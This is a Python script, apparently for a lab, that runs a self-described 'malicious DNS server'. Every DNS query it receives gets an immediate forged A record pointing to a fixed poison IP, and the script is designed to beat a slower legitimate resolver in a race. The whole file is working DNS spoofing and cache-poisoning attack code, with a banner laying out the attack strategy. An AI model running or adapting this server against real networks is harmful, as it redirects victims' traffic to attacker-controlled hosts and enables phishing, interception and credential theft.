#!/usr/bin/env python3

import socket
import struct
import threading
import time

POISON_IP = "10.0.0.50"  # Malicious IP we want to inject
LISTEN_PORT = 53

def create_dns_response(query_data, poison_ip=POISON_IP):
    """Create a DNS response packet from the query"""
    # Parse the query to get transaction ID
    txid = struct.unpack("!H", query_data[:2])[0]
    
    # Find the question section (skip header)
    header_size = 12
    qname_start = header_size
    qname_end = qname_start
    
    # Find end of question name (null terminator)
    while qname_end < len(query_data) and query_data[qname_end] != 0:
        qname_end += 1
    qname_end += 1  # Include null terminator
    
    # Extract question section
    question = query_data[header_size:qname_end + 4]  # +4 for qtype and qclass
    
    # DNS response header
    flags = 0x8180  # Standard query response, no error
    questions = 1
    answers = 1
    authority = 0
    additional = 0
    
    header = struct.pack("!HHHHHH", txid, flags, questions, answers, authority, additional)
    
    # Answer section
    name_ptr = 0xC00C  # Pointer to question name
    rrtype = 1  # A record
    rrclass = 1  # IN class
    ttl = 10  # 10 seconds
    rdlength = 4  # IPv4 address length
    rdata = socket.inet_aton(poison_ip)
    
    answer = struct.pack("!HHHLH", name_ptr, rrtype, rrclass, ttl, rdlength) + rdata
    
    return header + question + answer

def handle_dns_query(data, addr, sock):
    """Handle incoming DNS query and respond immediately"""
    try:
        # Create poisoned response
        response = create_dns_response(data)
        
        # Send response immediately (no delay!)
        sock.sendto(response, addr)
        
        # Extract domain name for logging
        try:
            # Parse question name
            pos = 12  # Skip header
            domain_parts = []
            while pos < len(data) and data[pos] != 0:
                length = data[pos]
                pos += 1
                domain_parts.append(data[pos:pos+length].decode())
                pos += length
            domain = ".".join(domain_parts)
        except:
            domain = "unknown"
        
        timestamp = time.strftime("%H:%M:%S")
        print(f"[{timestamp}] 🎯 FAST RESPONSE: {domain} -> {POISON_IP} (from {addr[0]})")
        
    except Exception as e:
        print(f"❌ Error handling query: {e}")

def start_dns_server():
    """Start the malicious DNS server"""
    print("🚀 Starting malicious DNS server...")
    print(f"   Listening on port {LISTEN_PORT}")
    print(f"   Will respond with: {POISON_IP}")
    print("   🏃‍♂️ FAST responses (no delay!)")
    print()
    
    # Create UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("0.0.0.0", LISTEN_PORT))
    
    print("✅ DNS server started! Waiting for queries...")
    
    while True:
        try:
            data, addr = sock.recvfrom(1024)
            
            # Handle query in separate thread for responsiveness
            thread = threading.Thread(target=handle_dns_query, args=(data, addr, sock))
            thread.daemon = True
            thread.start()
            
        except Exception as e:
            print(f"❌ Server error: {e}")

def main():
    print("=" * 60)
    print("🎯 MALICIOUS DNS SERVER (Race Condition Attack)")
    print("=" * 60)
    print("📋 Attack Strategy:")
    print("   1. Resolver forwards to BOTH proxy (slow) and attacker (fast)")
    print("   2. Proxy has 500ms delay")
    print("   3. Attacker responds immediately with poison IP")
    print("   4. First response wins!")
    print()
    print(f"🎯 Poison IP: {POISON_IP}")
    print()
    
    try:
        start_dns_server()
    except KeyboardInterrupt:
        print("\n⏹️ DNS server stopped")
    except Exception as e:
        print(f"❌ Failed to start server: {e}")

if __name__ == "__main__":
    main()
